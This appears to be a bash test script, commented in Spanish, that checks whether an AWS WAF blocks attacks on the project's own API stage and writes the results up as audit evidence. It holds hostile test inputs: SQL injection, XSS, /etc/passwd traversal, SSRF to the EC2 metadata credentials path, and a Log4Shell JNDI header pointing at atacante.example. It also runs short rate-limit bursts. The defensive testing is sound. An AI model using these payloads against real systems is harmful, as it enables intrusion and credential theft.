#!/usr/bin/env bash
# Prueba del AWS WAF encendido (bloque 5, sección 5.1). La corre waf-siem.yml.
# Uso: bash infra/pruebas/waf_ataques.sh <url-de-la-etapa-v1> <carpeta-de-salida>
#
# Política de pentest de AWS: sin inundación. Cada ataque es UNA solicitud; la prueba
# del límite por IP es una ráfaga corta (~4 por segundo) contra el umbral bajo de
# 100 solicitudes en 5 minutos, y se detiene en cuanto aparece el bloqueo.
set -uo pipefail

API="$1"
OUT="$2"
mkdir -p "$OUT"
UA="qwallet-prueba-waf/1.0"
TSV="$OUT/waf_casos.tsv"
: > "$TSV"

pedir() { # caso esperado descripción curl-args...
  local caso="$1" esperado="$2" desc="$3"; shift 3
  local cod
  cod=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "$@" 2>/dev/null || echo "err")
  printf '%s\t%s\t%s\t%s\n' "$caso" "$desc" "$esperado" "$cod" >> "$TSV"
  sleep 1
}

grande=$(python3 -c "print('{\"nota\":\"' + 'A'*9000 + '\"}')")

pedir C00 401 "Solicitud legítima sin token (el WAF deja pasar; Cognito rechaza)" -A "$UA" "$API/me?caso=C00"
pedir C01 403 "Inyección SQL en parámetro (A05:2025)" -A "$UA" -G "$API/users/search" \
  --data-urlencode "phone=1' OR '1'='1' --" --data-urlencode "caso=C01"
pedir C02 403 "Inyección SQL en cuerpo JSON (A05:2025)" -A "$UA" -X POST "$API/transfers?caso=C02" \
  -H 'Content-Type: application/json' --data "{\"destino\":\"1' UNION SELECT password FROM users--\",\"monto\":1}"
pedir C03 403 "XSS en parámetro (A05:2025)" -A "$UA" -G "$API/users/search" \
  --data-urlencode "phone=<script>alert(document.cookie)</script>" --data-urlencode "caso=C03"
pedir C04 403 "Lectura de archivos locales (path traversal)" -A "$UA" -G "$API/me" \
  --data-urlencode "archivo=../../../../etc/passwd" --data-urlencode "caso=C04"
pedir C05 403 "SSRF al servicio de metadatos de EC2 (A01:2025)" -A "$UA" -G "$API/me" \
  --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/" --data-urlencode "caso=C05"
pedir C06 403 "Log4Shell en cabecera (A03:2025 componentes vulnerables)" -A "$UA" "$API/me?caso=C06" \
  -H 'X-Api-Version: ${jndi:ldap://atacante.example/a}'
pedir C07 403 "Solicitud sin User-Agent (herramienta automatizada)" -A "" "$API/me?caso=C07"
pedir C08 403 "Cuerpo de más de 8 KB (abuso de tamaño)" -A "$UA" -X POST "$API/transfers?caso=C08" \
  -H 'Content-Type: application/json' --data "$grande"

# C09: throttling de API Gateway (CTRL-05, CA-06): 40 solicitudes simultáneas, una sola vez.
seq 1 40 | xargs -P 40 -I{} curl -s -o /dev/null -w '%{http_code}\n' --max-time 15 -A "$UA" "$API/me?caso=C09" \
  > "$OUT/c09.txt" 2>/dev/null
c429=$(grep -c '^429$' "$OUT/c09.txt" || true)
c401=$(grep -c '^401$' "$OUT/c09.txt" || true)
printf 'C09\t%s\t%s\t%s\n' "40 solicitudes simultáneas (throttling de API Gateway, ráfaga 20)" "algunas 429" "429: ${c429} · 401: ${c401}" >> "$TSV"

# C10: límite por IP del WAF (100 en 5 min). Ráfaga corta: ~4 por segundo hasta el bloqueo.
enviadas=0; primer403=""; t0=$(date +%s)
while [ $(( $(date +%s) - t0 )) -lt 240 ]; do
  cod=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -A "$UA" "$API/me?caso=C10")
  enviadas=$((enviadas + 1))
  if [ "$cod" = "403" ]; then primer403="$enviadas"; break; fi
  sleep 0.25
done
printf 'C10\t%s\t%s\t%s\n' "Ráfaga corta contra el límite por IP del WAF (100 en 5 min)" "403 al pasar el umbral" \
  "${primer403:+403 en la solicitud ${primer403} (${enviadas} enviadas en $(( $(date +%s) - t0 )) s)}${primer403:-sin bloqueo tras ${enviadas} solicitudes}" >> "$TSV"

{
  echo "EVD-5-02 AWS WAF bloqueando ataques contra la API (CTRL-17)"
  echo "Fecha: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
  echo "Destino: etapa v1 de API Gateway (endpoint execute-api), WAF encendido solo para esta prueba."
  echo
  printf '%-4s %-62s %-16s %s\n' "Caso" "Ataque" "Esperado" "Obtenido"
  while IFS=$'\t' read -r c d e o; do printf '%-4s %-62s %-16s %s\n' "$c" "$d" "$e" "$o"; done < "$TSV"
  echo
  ok=$(awk -F'\t' '$3==$4' "$TSV" | wc -l)
  echo "Casos de una sola solicitud con el código esperado: ${ok} de 9 (C00 a C08)."
  echo "La regla del WAF que bloqueó cada caso se lee en los logs del WAF (EVD-5-02b)."
} > "$OUT/EVD-5-02_waf_ataques.txt"
cat "$OUT/EVD-5-02_waf_ataques.txt"
